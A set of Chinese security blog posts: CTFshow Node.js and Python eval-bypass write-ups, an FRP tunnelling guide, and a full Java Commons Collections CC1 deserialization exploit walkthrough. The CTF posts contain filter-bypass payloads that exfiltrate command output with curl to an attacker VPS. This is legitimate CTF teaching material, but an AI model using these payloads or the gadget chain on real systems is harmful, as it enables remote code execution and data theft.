在/login里POST写入，然后刷新一次页面 在环境变量中读取flag 后面看了一下login.js到底过滤了什么 只过滤了text，没什么用 web344这题给出了部分代码，先分析一下 1234567891011121314router.get('/', function(req, res, next) { res.type('html'); var flag = 'flag_here'; if(req.url.match(/8c|2c|\\,/ig)){ res.end('where is flag :)'); } var query = JSON.parse(req.query.query); if(query.name==='admin'&amp;&amp;query.password==='ctfshow'&amp;&amp;query.isVIP===true){ res.end(flag); }else{ res.end('where is flag. :)'); }}); 过滤了8c、2c和逗号，然后要求GET传入参数query，且满足 query.name==='admin'&amp;&amp;query.password==='ctfshow'&amp;&amp;query.isVIP===true 才可以拿到flag 也就是正常情况下我们应该传入 1?query={&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true} 而经过URL编码之后变成 1?query=%7B%22name%22%3A%22admin%22%2C%22password%22%3A%22ctfshow%22%2C%22isVIP%22%3Atrue%7D 双引号编码之后是%22，和c连接起来就是%22c，会被ban 这题用到了NodeJS的特性，当 URL 里传入了多个同名参数，如多次出现 query=，Express 解析会将这些参数放入数组中，然后JSON.parse 会将数组的字符串元素拼接成一个完整字符串再解析。同时c也要进行URL编码，变成%63，这样就不会被ban了 payload： 1?query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true} 参考bfengj：CTFshow-WEB入门-node.js yu22x：CTFSHOW nodejs篇","link":"/posts/ctfshow-nodejs-web334-web344/"},{"title":"工具推荐 | 内网穿透神器FRP部署教程","text":"工具介绍FRP是一款高性能的反向代理工具，可以将位于NAT或防火墙后的本地服务器暴露到互联网上。目前支持TCP、UDP、HTTP和HTTPS协议，可通过域名将请求转发至内部服务，此外还提供P2P直连模式 Github地址：https://github.com/fatedier/frp 本文尽可能简单叙述，方便大家快速部署，因当前最新版是0.63.0，因此本文在0.63.0的基础上书写 准备条件 一台拥有公网IP的服务器（推荐阿里云、腾讯云等） 一个域名（非必需） 服务端安装打开https://github.com/fatedier/frp/tree/v0.63.0, 下载frp_0.63.0_linux_amd64.tar.gz 上传到服务器然后解压 1tar -zxvf frp_0.63.0_linux_amd64.tar.gz 配置cd进入frp_0.63.0_linux_amd64文件夹，输入vim frps.toml编辑frps.toml 12345678910111213141516# frp客户端与服务端连接的端口bindPort = 7000# 用来接收HTTP请求的端口vhostHTTPPort = 8088 #如端口冲突可自行切换# 认证配置[auth]token = &quot;admin_token&quot; #用于连接验证，请自行设置# Web仪表盘配置[webServer]addr = &quot;0.0.0.0&quot;port = 7500user = &quot;admin&quot; #请自行设置password = &quot;admin&quot; #请自行设置 按下ESC进入命令模式，然后输入:wq并按回车键，保存文件并退出Vim 运行为了能在后台持续运行，这里用screen启动一个新窗口 1screen -S frp #名字可以自定义 赋予执行权限 1chmod +x frps 运行脚本 1./frps -c ./frps.toml 按下组合键 ctrl+a+d 关闭当前screen窗口，运行下面的命令可以再次进入窗口 12screen -ls #查看当前screen状态screen -r frp 网页仪表盘成功运行之后，打开http://你的服务器IP:7500，即可进入仪表盘页面，可以查看当前的配置、连接等状态 客户端安装打开https://github.com/fatedier/frp/tree/v0.63.0, 下载frp_0.63.0_windows_amd64.zip 配置解压并打开文件夹，编辑frpc.toml 1234567891011serverAddr = &quot;你的服务器IP地址&quot;serverPort = 7000[auth]token = &quot;admin_token&quot; #需要跟服务端的token保持一致，用于验证[[proxies]]name = &quot;my-web-service&quot; #可自行设置type = &quot;tcp&quot; #穿透的协议类型，ip+端口的话用tcplocalPort = 80 #需要穿透的本机端口remotePort = 8085 #指定服务端访问的端口，也就是可以通过&quot;你的服务器IP:8085&quot;访问到本机的&quot;127.0.0.1:80&quot; (可选)域名配置如果你有自己的域名，则可以进行域名配置，以获得更佳的体验 我这里用的是namesilo，其他的域名提供商也一样操作 具体操作就是在DNS Record添加一条A记录，地址填你的服务器IP，名字可以自定义，后面就通过这个子域名访问你的服务 然后打开frpc.toml重新编辑 1234567891011serverAddr = &quot;你的服务器IP地址&quot;serverPort = 7000[auth]token = &quot;admin_token&quot; #需要跟服务端的token保持一致，用于验证[[proxies]]name = &quot;my-web-service&quot; type = &quot;http&quot; #域名+端口的话需要用httplocalPort = 80 #需要穿透的本机端口，也就是可以通过&quot;你的域名:8088&quot;访问到本机的&quot;127.0.0.1:80&quot;customDomains = [&quot;win.xxxxxx.com&quot;] #这里用你自己的域名 需要注意的是，当代理类型为 http 或 https时，访问端口由服务端的 vhostHTTPPort决定，而不是客户端的 remotePort 运行在frp_0.63.0_windows_amd64文件夹打开cmd，输入 1frpc -c frpc.toml 然后公网访问 1http://你的服务器IP:8085 如果你配置了域名，就可以公网访问 1win.xxxxxx.com:8088 实例这里我举个简单的例子，方便大家理解 无域名我在本地部署了一个DVWA漏洞靶场，假如我想把它分享给其他人，应该怎么做 在服务端部署完毕后，回到本地电脑，phpstudy打开服务 由于我的DVWA部署在本地8084端口，因此先修改frpc.toml 1234567891011serverAddr = &quot;你的服务器IP地址&quot;serverPort = 7000[auth]token = &quot;admin_token&quot;[[proxies]]name = &quot;my-web-service&quot;type = &quot;tcp&quot;localPort = 8084 #需要穿透的本机端口remotePort = 8085 #指定服务端的端口 然后保存退出，在当前文件夹cmd执行 1frpc -c frpc.toml 接着访问你的服务器IP地址:8085即可 有域名同样是以DVWA漏洞靶场为例，先用phpstudy打开服务，然后修改frpc.toml 1234567891011serverAddr = &quot;你的服务器IP地址&quot;serverPort = 7000[auth]token = &quot;admin_token&quot;[[proxies]]name = &quot;my-web-service&quot; type = &quot;http&quot;localPort = 8084 #需要穿透的本机端口customDomains = [&quot;win.xxxxxx.com&quot;] #这里用你自己的域名 然后保存退出，在当前文件夹cmd执行 1frpc -c frpc.toml 接着访问你的域名:8088即可 常见问题与排错 (FAQ)如果你发现连接不到服务端的端口，请检查防火墙是否放行相关端口，如果系统本身已放行端口但仍无法访问，可能是服务器提供商那边的防火墙未放行，这时需要到提供商那边（假如是阿里云）放行相关端口","link":"/posts/frp-deployment-tutorial/"},{"title":"Java反序列化 CC1链分析","text":"CC1链子介绍Commons Collections是Apache开源社区推出的一款针对Java集合框架的扩展工具库，它提供了大量额外的数据结构和算法，包括有序集合、队列、堆、双向映射等功能丰富的集合实现，以及诸如过滤、转换等高级操作接口。该库极大地补充和完善了Java标准集合API，让开发者在处理复杂集合数据时更加高效灵活，同时简化了代码编写，是Java项目中广泛应用的实用工具 CC1链分国内（TransformedMap）和国外（LazyMap），本文介绍的是国内的TransformedMap链，该链相比国外，结构更为直接，调用链清晰，适合快速构造验证和理解 环境准备下载安装 JDK-8u65官网：Java 存档下载 — Java SE 8 | Oracle 中国 安装之后配置到IDEA，在右上角文件处打开项目结构，或者直接用快捷键 Ctrl+Alt+Shift+S 打开 然后在项目处选择SDK为JDK 1.8.0_65 通过Maven下载CommonsCollections3.2.1复制以下代码到pom.xml的&lt;dependencies&gt;标签里面 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; 保存即可 配置对应源码jdk自带的包里面有些文件是反编译的.class文件，不利于研究分析，为方便调试，我们安装对应的源码 下载地址：jdk8u/jdk8u/jdk: af660750b2f4 点击zip下载压缩包，然后自行解压 在我们之前安装的jdk8u_65文件夹中，找到src.zip的压缩包，解压到当前文件夹下，然后把jdk-af660750b2f4\\src\\share\\classes里的sun文件夹复制到jdk8u_65文件夹中的src里面 接着打开IDEA，在项目结构（Ctrl+Alt+Shift+S）里面找到SDK处，在源路径添加jdk8u_65的src文件夹，保存 到这里就配置完成了，可以开始调试分析了 CC1链分析利用点CC1源头就是Commons Collections库中的Tranformer接口，里面有个transform方法 寻找继承了这个接口的类，看看transform方法是如何实现的，可以快捷键Ctrl+Alt+B快速查看实现方法 发现InvokerTransformer类继承了该接口，重写了transform方法，同时还继承了Serializable接口，符合我们的要求 可以看到，这些参数都是可以控制的，那我们利用这点，传入参数调用invoke函数就可以触发任意类任意方法 我们的目标是实现Runtime.getRuntime().exec(&quot;calc&quot;); 构建以下代码实现，方法名为exec，参数类型为String，值为calc 1234567public class test2 { public static void main(String[] args) throws Exception { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}); invokerTransformer.transform(r); }} 成功弹出计算器 溯源接下来就是一步步回溯，寻找可以利用的类，直到到达重写后的readObject()方法 首先先寻找有哪些类的哪些方法调用了transform，右键点击查找用法（或者Alt+F7） 发现TransformedMap类的checkSetValue方法调用了transform 再看看TransformedMap类的构造函数，可以看到由三个参数组成 其中第一个参数为Map类型，我们可以传入HashMap，第二和第三个参数为Transformer类型，同样可控 但是需要注意的是，TransformedMap构造函数属于Protected方法，不能通过外部直接调用，但很巧的是，在TransformedMap类找到了decorate方法，返回一个TransformedMap的实例对象，且属于Public static方法，外部可以直接调用 那我们可以构造代码，第一个参数传入map，第二个用不到就传个null，第三个参数传入invokerTransformer 1234Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;});Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object, Object&gt; transformermap = TransformedMap.decorate(map,null,invokerTransformer); 接下来就是要找哪里调用了checkSetValue方法，右键查找用法 发现有且仅有一处调用了checkSetValue方法，类名为AbstractInputCheckedMapDecorator，然后TransformedMap类刚好又继承了AbstractInputCheckedMapDecorator类 而AbstractInputCheckedMapDecorator类又继承了AbstractMapDecorator AbstractMapDecorator实现了Map接口 而Map接口里的Entry有setValue方法，也就是说AbstractInputCheckedMapDecorator重写了setValue方法，而重写后的方法调用了checkSetValue，刚好符合我们的要求 因此我们对Map进行遍历，使其调用重写后的setValue方法，进而调用checkSetValue，执行命令 12345678910111213public class test2 { public static void main(String[] args) throws Exception { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;});// invokerTransformer.transform(r); Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;hello&quot;,&quot;world&quot;); Map&lt;Object, Object&gt; transformermap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformermap.entrySet()){ entry.setValue(r); } }} 成功弹出计算器 接下来我们继续分析，寻找哪些方法调用了setValue，右键查找用法 发现AnnotationInvocationHandler类的readObject方法调用了setValue，刚好满足我们的要求，也寻到了入口，一举两得 查看AnnotationInvocationHandler的构造函数，参数为一个Class对象和一个Map对象，其中Class对象继承自Annotation，需要我们传一个注解类进去，然后memberValues传入之前的transformermap 再看看AnnotationInvocationHandler的访问权限，发现并没有Public等访问修饰符，则默认表示Package-local方法，即只能在同一个包下访问，在包外的类中是不可见的，无法调用 但可以通过反射调用方法getDeclaredConstructor来获取声明构造函数，简单修改后就可以实现包外调用，这里介绍一下与getConstructor的区别 方法 查找范围 返回哪些方法 是否支持私有/受保护方法 getDeclaredConstructor 获取声明方法 只查本类 所有声明（包括私有、受保护等） 支持（需 setAccessible(true)） getConstructor 获取方法 本类和父类链 仅public方法（含继承） 不支持 因此我们通过反射来获取这个类，修改访问权限后就可以在外部调用了 1234Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class);//获取构造器annotationConstructor.setAccessible(true);//修改访问权限Object o = annotationConstructor.newInstance(Override.class,transformermap); 拼接上之前的内容，就形成骨架，完成百分之七八十了 123456789101112131415161718192021222324252627public class test2 { public static void main(String[] args) throws Exception { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;});// invokerTransformer.transform(r); Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;hello&quot;,&quot;world&quot;); Map&lt;Object, Object&gt; transformermap = TransformedMap.decorate(map,null,invokerTransformer);// for(Map.Entry entry:transformermap.entrySet()){// entry.setValue(r);// } Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Override.class,transformermap); serialize(o); unserialize(&quot;cc1.txt&quot;); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc1.txt&quot;)); oos.writeObject(obj); } public static void unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); ois.readObject(); }} 但如果直接运行是不行的，这也就是剩下的百分之二三十需要我们解决的问题了 待解决问题分析之前的代码，发现有三个明显的问题尚未解决 问题一：Runtime类没有继承Serializable接口，无法序列化 问题二：readObject()方法怎样通过两个if判断进入setValue()方法 问题三：readObject方法里的setValue参数不可控 我们按顺序逐个解决以上问题 修补问题一： 首先解决第一个问题，虽然Runtime类没有继承Serializable接口，但是Class类继承了Serializable，当Runtime在 JVM 加载后，会有唯一的 Class&lt;Runtime&gt; 实例，它是对 Runtime 这个类型的描述。我们可以通过反射实现Runtime类 构造以下代码反射实现Runtime类 12345Class cs = Runtime.class;Method getRuntime = cs.getMethod(&quot;getRuntime&quot;, null);// 第二个null表示参数内容，加不加都可以Runtime cmd = (Runtime) getRuntime.invoke(null, null);// 第一个null表示调用静态方法，第二个null同上Method control = cs.getMethod(&quot;exec&quot;, String.class);control.invoke(cmd, &quot;calc&quot;); 验证一下，成功弹出计算器 然后改用InvokerTransformer的transform实现以上代码 12345678Class cs = Runtime.class;// Method getRuntime = cs.getMethod(&quot;getRuntime&quot;, null);// Runtime cmd = (Runtime) getRuntime.invoke(null, null);// Method control = cs.getMethod(&quot;exec&quot;, String.class);// control.invoke(cmd, &quot;calc&quot;);Method getRuntime = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}).transform(cs);Runtime cmd = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}).transform(cmd); 但是分开的话不好处理，需要找个方法合并起来，回到一开始的Transformer.java右键transform查找用法，发现ChainedTransformer的transform方法可以循环遍历transform 看看构造函数，要求传个数组 那我们可以构造以下代码实现 1234567891011Class cs = Runtime.class;// Method getRuntime = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}).transform(cs);// Runtime cmd = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);// new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}).transform(cmd);Transformer[] transformers = new Transformer[]{ new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})};ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(cs); 成功解决问题一 我们修改一下之前骨架的内容 123456789101112Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;});// 将上面的代码修改成下面的代码Class cs = Runtime.class;Transformer[] transformers = new Transformer[]{ new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})};ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 问题二： 首先在AnnotationInvocationHandler类的readObject方法的第一个if判断语句处打断点，调试后可以看到memberType值为null，无法进入if语句 分析代码，可知memberTypes是表示注解类型里所有成员及其对应的数据类型的映射关系，然后memberType获取注解中成员变量的名称 一开始我们用的是注解Override，这里面没有成员变量 那就不用这个，继续寻找发现注解Target里有成员变量value，可以用这个 回到之前的exp骨架那里，修改两处地方 重新调试一遍，这次没有问题了，成功进入第一个if语句 接下来就是第二个if语句，只要我们传入的value既不是memberType对应类型的实例，也不是异常代理类对象ExceptionProxy实例，就可以进入if语句 因为成员value的声明类型是枚举数组ElementType[]，而传入的是字符串&quot;world&quot;，判断后返回false，然后经过取反后就变为true，成功进入if语句 问题三： 最后就是解决readObject()调用的setValue()参数不可控，继续分析代码，发现ConstantTransformer类刚好满足我们的要求，它重写后的transform可以返回我们传入的对象 修改之前的代码 12345678910111213141516Class cs = Runtime.class;Transformer[] transformers = new Transformer[]{ new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) };// 将上面的代码修改成下面的代码，添加ConstantTransformerClass cs = Runtime.class;Transformer[] transformers = new Transformer[]{ new ConstantTransformer(cs),// 修改这里 new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; 完整代码把之前的代码合并在一起，得到以下完整代码 1234567891011121314151617181920212223242526272829public class test2 { public static void main(String[] args) throws Exception { Class cs = Runtime.class; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(cs), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;,&quot;world&quot;); Map&lt;Object, Object&gt; transformermap = TransformedMap.decorate(map,null,chainedTransformer); Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class,transformermap); serialize(o); unserialize(&quot;cc1.txt&quot;); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc1.txt&quot;)); oos.writeObject(obj); } public static void unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); ois.readObject(); }} 成功弹出计算器，实现完整的漏洞链利用 到这里CC1的复现就结束了，确实不容易，不过收获很大，想要提升水平还是得多练代码审计，继续加油吧","link":"/posts/java-cc1-gadget-chain-analysis/"},{"title":"CTFSHOW | 其他篇题解（三）web438 - web460","text":"前言由于题目比较多，所以分三个部分来写，这是第三部分 题目列表web438这题跟web435方法一样，我们简单回顾一下过程 为了绕过限制，可以反转代码来执行，具体方法是用字符串切片方法来反转字符串 1?code=str(')&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1]) 可以先用str在网页看原始代码，检查是否正确 然后套个exec执行这串代码就可以 payload： 1?code=str(exec(')&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) 我们把它的源码爆出来看看 1?code=str(exec(')&quot;`yp.ppa 0 w- 46esab`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) 12345678910111213141516171819202122232425262728293031323334from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: return uchar return chr(inside_code)def stringQ2B(ustring): return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/')def app_index(): code = request.args.get('code') if code: code = stringQ2B(code) if '\\\\u' in code: return 'hacker?' reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这题比web437多过滤了{，但这个符号我们用不到，所以不影响 payload： 1?code=str(exec(')&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) web439这题可以继续用上题的方法，我们把源码爆出来分析一下 1?code=str(exec(')&quot;`yp.ppa 0 w- 46esab`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) 123456789101112131415161718192021222324252627282930313233343536from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: return uchar return chr(inside_code)def stringQ2B(ustring): return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/')def app_index(): code = request.args.get('code') if code: code = stringQ2B(code) if '\\\\u' in code: return 'hacker?' if '\\\\x' in code: return 'hacker?' reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到这题比上题多过滤了\\x，\\x 是一种转义序列，用来表示十六进制形式的字符，比如 \\x41 代表 ASCII 字符 'A' 但是我们并没有用到这个，所以不影响 payload： 1?code=str(exec(')&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) web440这题把引号禁了，我们可以用chr构造字符串。先用ord返回unicode数值，然后再经过chr转换成字符即可，我们写个python脚本 payload： 12345s = &quot;import os;os.system('curl http://你的vps地址:端口?p=`ls`')&quot;res = ''for i in s: res += f&quot;chr({ord(i)})%2B&quot;print('str(exec('+res[:-3]+'))') 把结果拼接到网站GET发送 1?code=你的代码运行结果 修改命令为cat /flag获取flag即可 web441经过分析，这题把加号过滤了，放出部分源码看看 1234re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\\'|&quot;|\\+') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;' 那我们用join函数来拼接字符即可，例如.join(['1','2','3'])，结果是 ‘123’。 join必须作为字符串的方法调用，即调用它的对象必须是字符串，所以前面要有字符串和点号（.）来调用该函数 payload： 12345s = &quot;import os;os.system('curl http://你的vps地址:端口?p=`ls`')&quot;res = ''for i in s: res += f&quot;chr({ord(i)}),&quot;print('exec(str().join(['+res[:-1]+']))') 把结果拼接到网站GET发送 1?code=你的代码运行结果 修改命令为cat /flag获取flag即可 web442这题把数字过滤了 1234re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\\'|&quot;|\\+|[0-9]') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;' 我们用request.args.get方法获取参数值即可。request.args.get 是 Flask 框架中获取 URL 查询参数（即 GET 请求中 URL 中 ?key=value 部分参数）的方法 payload： 1?code=str(exec(request.args.get(request.method)))&amp;GET=import os;os.system('curl http://你的vps地址:端口?p=`cat /flag`') web443把request过滤了，关键代码如下 1234re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\\'|&quot;|\\+|[0-9]|request') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;' 题目提示提交参数为POST，那我们后面用POST提交数据 这题我们可以继续用request.args.get，不过里面的request需要变换一下。我们打印全局变量出来看看 1code=str(globals()) 可以看到里面有个键是request，我们要利用的就是这个。由于Python 中列表、元组、字符串等序列的索引是从 0 开始的，所以request所在的索引为10。又因为数字和加号被禁了，所以我们可以用True来表示1，用两个减号表示加号 因此10可以这么写 1True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True) 然后用list(globals().keys())[]来获取对应的键名，再放进globals()[]获取对应的属性和方法，从而调用args.get()获取参数值 1globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]] 可以把这个理解为request，那么request.args.get(request.method)就等于 1globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method) 然后在路径后面拼接参数POST，传入代码即可 1?POST=import os;os.system('curl http://你的vps地址:端口?p=`ls`') 到这里，我们成功把代码弄好了，可以用str函数打印出来验证一下，POST传入 1code=str(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)) 最后用exec函数运行代码即可 POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=import os;os.system('curl http://你的vps地址:端口?p=`cat /flag`') web444这题的附件把代码给出来了 12345678910111213141516171819202122232425262728293031323334353637from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: return uchar return chr(inside_code)def stringQ2B(ustring): return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/',methods=['POST', 'GET'])def app_index(): if request.method == 'POST': code = request.form['code'] if code: code = stringQ2B(code) if '\\\\u' in code: return 'hacker?' if '\\\\x' in code: return 'hacker?' reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\\'|&quot;|\\+|[0-9]|request|len') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这题把len过滤了，可以继续用上题的方法 POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=import os;os.system('curl http://你的vps地址:端口?p=`cat /flag`') web445这题代码总体跟上题差不多，不过开头那里把os.system和os.popen去掉了 那直接调用肯定是不行的了，可以用reload函数重新加载os模块，然后再重新调用system函数 简单介绍一下reload，reload 是 Python 中用于重新加载已导入模块的函数。 作用 Python 的模块在导入时会被缓存，后续再次导入同一模块时不会重新执行模块代码，而是直接使用缓存 reload 函数可以让已经导入的模块重新执行代码，更新模块内容（相当于“刷新”模块），适合在开发或调试时修改代码后即时生效，而不需要重启程序 使用方法 Python 2 中 reload() 是内置函数，可以直接调用 Python 3 中，reload() 被移到 importlib 模块中，需要先导入使用 我们POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=from importlib import reload;reload(os);os.system('curl http://你的vps地址:端口?p=`cat /flag`') 成功得到flag web446这题相比上题把imp.reload函数去掉了 imp 是 Python 早期用于动态加载模块的内置模块，在 Python 3.4 之后，imp 模块已被废弃，不再推荐使用，而是被更强大的 importlib 模块所取代 所以这题可以继续使用上题的方法 POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=from importlib import reload;reload(os);os.system('curl http://你的vps地址:端口?p=`cat /flag`') web447对比一下代码 这题过滤了挺多东西，例如用于创建和管理子进程的subprocess模块和用于测量一小段代码执行时间的timeit模块，但是不影响我们用之前的方法 POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=from importlib import reload;reload(os);os.system('curl http://你的vps地址:端口?p=`cat /flag`') web448对比一下代码 这题把好多模块都设置为None，sys.modules 